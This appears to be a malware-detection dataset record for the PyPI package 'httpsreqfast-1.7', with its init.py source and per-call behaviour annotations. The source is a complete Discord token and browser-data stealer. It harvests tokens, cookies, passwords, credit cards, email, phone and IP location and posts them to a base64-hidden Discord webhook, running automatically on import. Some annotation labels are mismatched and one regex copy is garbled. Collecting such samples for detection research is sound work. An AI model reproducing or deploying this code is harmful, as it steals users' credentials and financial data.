{
  "metadata": {
    "package_name": "httpsreqfast-1.7",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/httpsreqfast-1.7.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/httpsreqfast-1.7.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "init.py",
      "code_snippets": [
        {
          "snippet": "import os, re, shutil, requests, threading\n\nclass Setup:\n    def __init__(self):\n        self.__akrt = \"aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTY1NzMxOTIwNzc0MzA3OTUwL2lMOWE5X0wzMU9BWnYxRk5lNXQ3UVp6ampzZ2ozSHFhY25TWUNwM0RTWjJEc2h3X2ZuRV9JWDBodVVCdmpXMHFwVEJ6\"\n        self.__url_check = \"https://discord.com/api/v9/users/@me/guilds\"\n        self.__browser_path = [\n            '_Roaming/Discord/Local Storage/leveldb',\n            '_Roaming/Lightcord/Local Storage/leveldb',\n            '_Roaming/discordcanary/Local Storage/leveldb',\n            '_Roaming/discordptb/Local Storage/leveldb',\n            '_Roaming/Opera Software/Opera Stable/Local Storage/leveldb',\n            '_Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb',\n            '_Local/Amigo/User Data/Local Storage/leveldb',\n            '_Local/Torch/User Data/Local Storage/leveldb',\n            '_Local/Kometa/User Data/Local Storage/leveldb',\n            '_Local/Orbitum/User Data/Local Storage/leveldb',\n            '_Local/CentBrowser/User Data/Local Storage/leveldb',\n            '_Local/7Star/7Star/User Data/Local Storage/leveldb',\n            '_Local/Sputnik/Sputnik/User Data/Local Storage/leveldb',\n            '_Local/Vivaldi/User Data/Default/Local Storage/leveldb',\n            '_Local/Google/Chrome SxS/User Data/Local Storage/leveldb',\n            '_Local/Epic Privacy Browser/User Data/Local Storage/leveldb',\n            '_Local/Google/Chrome/User Data/Default/Local Storage/leveldb',\n            '_Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb',\n            '_Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb',\n            '_Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb',\n            '_Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb',\n            '_Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb'\n        ]\n        self.__files = [\n            f\"{temp_folder}\\\\Chromium Cookies.txt\",\n            f\"{temp_folder}\\\\Chromium Passwords.txt\",\n            f\"{temp_folder}\\\\Chromium CreditCards.txt\",\n            f\"{temp_folder}\\\\metazip.zip\"\n        ]\n        self.__rharha = self.__encoder._decode_data(self.__akrt)\n\n    def __get_tokens(self):\n        try:\n            tokens = []\n            threading.Thread(target=self.__browser._get_tokens_firefox, args=(tokens,)).start()\n            for path in self.__browser_path:\n                path = path.replace(\"_Local\", local).replace('_Roaming', roaming)\n                if os.path.exists(path):\n                    for filename in os.listdir(path):\n                        if not filename.endswith(\".log\") and not filename.endswith(\".ldb\"):\n                            continue\n                        else:\n                            for line in [i.strip() for i in open(f\"{path}\\\\{filename}\", errors=\"ignore\").readlines() if i.strip()]:\n                                for token in re.findall(r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}', line):\n                                    tokens.append(token)\n            return set(tokens)\n        except:\n            pass\n\n    def __check_tokens(self, tokens):\n        try:\n            valid_tokens = []\n            for token in tokens:\n                try:\n                    result = requests.get(self.__url_check, headers = {\n                            \"Authorization\": token\n                    })\n                    if result.status_code == 200:\n                        valid_tokens += f\"{token}\\n\"\n                except:\n                    pass\n            return valid_tokens\n        except:\n            pass\n\n    def __recreate_tokens(self, char_array):\n        try:\n            tokens = []\n            token = \"\"\n            for char in char_array:\n                if char == '\\n':\n                    tokens.append(token)\n                    token = \"\"\n                else:\n                    token += char\n            return tokens\n        except:\n            pass\n\n    def __get_datas(self, token):\n        try:\n            data = []\n            userdata = requests.get(\"https://discord.com/api/v9/users/@me\", headers = {\n                \"Authorization\": token\n            }).json()\n            phone = userdata['phone']\n            data.append(f\"email -> {userdata['email']}\")\n            if (phone is not None):\n                data.append(f\"phone -> {phone}\")\n            return data\n        except:\n            pass\n\n    def __has_payment_methods(self, token) -> bool:\n        try:\n            has_billing = False\n            billing = requests.get(\"https://discordapp.com/api/v6/users/@me/billing/payment-sources\", headers = {\n                \"Authorization\": token\n            }).json()\n            if len(billing) > 0:\n                has_billing = True\n            return has_billing\n        except:\n            pass\n\n    def __format_data(self, verified_tokens):\n        try:\n            content = \"\"\n            if len(verified_tokens) > 0:\n                for count, token in enumerate(verified_tokens, start=1):\n                    content += f\"\\n\\nToken #{count}:\\n{self.__encoder._encode_data(token)}\"\n                    datas = self.__get_datas(token)\n                    for data in datas:\n                        content += f\"\\n{str(data)}\"\n                    content += f\"\\nbilling -> {self.__has_payment_methods(token)}\"\n            else:\n                content = \"No tokens found!\\n\"\n            return content\n        except:\n            pass\n\n    def __get_browser_data(self):\n        try:\n            self.__browser._main()\n            for file in self.__files:\n                request_post(self.__rharha, file)\n        except:\n            pass\n\n    def main(self):\n        try:\n            if os.name != \"nt\":\n                exit(1)\n            receiver = Receiver()\n            threading.Thread(target=self.__get_browser_data).start()\n            tokens = self.__get_tokens()\n            verfied_tokens = self.__check_tokens(tokens)\n            recreated_tokens = self.__recreate_tokens(verfied_tokens)\n            content = self.__format_data(recreated_tokens)\n            payload = {\n                \"embeds\": [\n                    {\n                        \"title\": \"Discord Informations:\",\n                        \"description\": f\"```{content}\\n```\",\n                        \"color\": 0\n                    },\n                    {\n                        \"title\": \"Computer Informations:\",\n                        \"description\": f\"```Compter Name -> {os.getenv('COMPUTERNAME')}\\n\"\n                                        + f\"Username -> {os.getenv('USERNAME')}```\",\n                        \"color\": 0\n                    },\n                    {\n                        \"title\": \"Network Informations\",\n                        \"description\": f\"```Ip -> {receiver._get_ip()}\\n\"\n                                    + f\"Location -> {receiver._get_location()}\\n\"\n                                    + f\"Country -> {receiver._get_country()}\\n\"\n                                    + f\"Region -> {receiver._get_region()}\\n\"\n                                    + f\"ISP -> {receiver._get_isp()}```\",\n                        \"color\": 0\n                    }\n                ]\n            }\n            requests.post(self.__rharha, json=payload)\n            shutil.rmtree(temp_folder)\n        except:\n            pass\n\ntry:\n    threading.Thread(target=Setup().main).start()\nexcept:\n    pass",
          "triple_sequences": [
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine directory presence",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "f\"{path}\\{filename}\"",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "r'[-\u00000]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}', line",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract browser tokens",
              "intention_id": "extract_browser_tokens"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.__url_check, headers = {\"Authorization\": token}",
              "object_description": "Discord API endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "\"https://discord.com/api/v9/users/@me\", headers = {\"Authorization\": token}",
              "object_description": "Discord API endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "\"https://discordapp.com/api/v6/users/@me/billing/payment-sources\", headers = {\"Authorization\": token}",
              "object_description": "Discord API endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "self.__encoder._encode_data()",
              "action_description": "Encode string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "token",
              "object_description": "Account name and token",
              "object_id": "account_credentials",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "self.__get_datas()",
              "action_description": "Collect system information",
              "action_id": "collect_system_info",
              "object": "token",
              "object_description": "API key or token",
              "object_id": "api_key",
              "intention_description": "Gather system information",
              "intention_id": "gather_system_information"
            },
            {
              "action_api": "self.__has_payment_methods()",
              "action_description": "Collect browser information",
              "action_id": "collect_browser_info",
              "object": "token",
              "object_description": "API key or token",
              "object_id": "api_key",
              "intention_description": "Extract country information",
              "intention_id": "extract_country_information"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'COMPUTERNAME'",
              "object_description": "Environment variable for Windows hostname",
              "object_id": "windows_hostname_env_var",
              "intention_description": "Access computer name",
              "intention_id": "access_computer_name"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'USERNAME'",
              "object_description": "Current username",
              "object_id": "current_username",
              "intention_description": "Access current username",
              "intention_id": "access_current_username"
            },
            {
              "action_api": "receiver._get_ip()",
              "action_description": "Collect system information",
              "action_id": "collect_system_info",
              "object": "",
              "object_description": "Public IP address",
              "object_id": "public_ip_address",
              "intention_description": "Collect public IP address",
              "intention_id": "collect_public_ip"
            },
            {
              "action_api": "receiver._get_location()",
              "action_description": "Collect system information",
              "action_id": "collect_system_info",
              "object": "",
              "object_description": "Country code",
              "object_id": "country_code",
              "intention_description": "Extract country information",
              "intention_id": "extract_country_information"
            },
            {
              "action_api": "receiver._get_country()",
              "action_description": "Collect system information",
              "action_id": "collect_system_info",
              "object": "",
              "object_description": "Country code",
              "object_id": "country_code",
              "intention_description": "Extract country information",
              "intention_id": "extract_country_information"
            },
            {
              "action_api": "receiver._get_region()",
              "action_description": "Collect system information",
              "action_id": "collect_system_info",
              "object": "",
              "object_description": "Country code",
              "object_id": "country_code",
              "intention_description": "Extract country information",
              "intention_id": "extract_country_information"
            },
            {
              "action_api": "receiver._get_isp()",
              "action_description": "Collect system information",
              "action_id": "collect_system_info",
              "object": "",
              "object_description": "ISP",
              "object_id": "",
              "intention_description": "Extract country information",
              "intention_id": "extract_country_information"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.__rharha, json=payload",
              "object_description": "Discord API endpoint",
              "object_id": "discord_api_endpoint",
              "intention_description": "Transmit environment data to remote server",
              "intention_id": "transmit_environment_data_server"
            },
            {
              "action_api": "shutil.rmtree()",
              "action_description": "Recursively deletes directory and its contents",
              "action_id": "delete_directory",
              "object": "temp_folder",
              "object_description": "Temporary directory",
              "object_id": "temporary_directory",
              "intention_description": "Delete directory content",
              "intention_id": "delete_directory_content"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=Setup().main",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "threading.Thread().start()",
              "action_description": "Starts thread execution",
              "action_id": "start_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Wait for events",
              "intention_id": "wait_for_events"
            }
          ]
        }
      ]
    }
  ]
}